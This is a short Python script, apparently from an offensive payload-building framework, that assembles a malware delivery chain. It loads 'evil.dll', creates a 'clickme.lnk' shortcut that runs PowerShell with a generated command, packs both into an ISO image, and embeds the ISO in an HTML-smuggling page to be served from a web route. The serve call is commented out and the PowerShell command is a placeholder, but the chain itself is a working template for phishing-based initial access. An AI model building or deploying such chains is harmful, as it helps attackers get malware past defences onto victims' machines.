from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import makePowershell

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute, PluginDecorator, enableOut
from web import serve


def main():
    # DLL
    payloadData = readFileContent('payloads/evil.dll')
    payloadFile = makeAceFile('evil.dll', payloadData)
    
    # LNK to powershell.exe to execute DLL
    payloadExecData = 'ls evil.dll'
    payloadExecData = makePowershell(
        input=payloadExecData,
        options={},
    )
    payloadExec = makeLnk(
        name = "clickme.lnk",
        target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        arguments = "-noexit -command {}".format(payloadExecData),
    )
    payloadExeFile = makeAceFile('clickme.lnk', payloadExec)

    # Pack DLL and LNK into ISO
    container = makeIso(
        files = [
            payloadFile,
            payloadExeFile,
        ],
    )
    containerFile = makeAceFile('test2.iso', container)

    # HTML to serve ISO
    html = makeHtmlSmuggling(
        containerFile,
    )

    # serve HTML
    serveHtml = AceRoute('/test2', html)
    #serve([serveHtml])


if __name__ == "__main__":
    enableOut()
    main()
